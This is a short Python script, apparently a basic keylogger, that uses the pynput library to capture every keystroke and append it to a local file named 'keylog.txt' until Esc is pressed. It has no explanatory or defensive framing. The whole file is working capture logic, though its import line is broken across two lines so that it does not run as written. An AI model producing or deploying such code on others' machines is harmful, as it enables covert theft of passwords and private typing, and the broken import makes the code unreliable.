from pynput.keyboard
import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handling special keys like 'space', 'shift', etc.
        with open(log_file, "a") as f:
            f.write(str(key) + "\n")

def on_release(key):
    if key == Key.esc:
        # Stop the listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
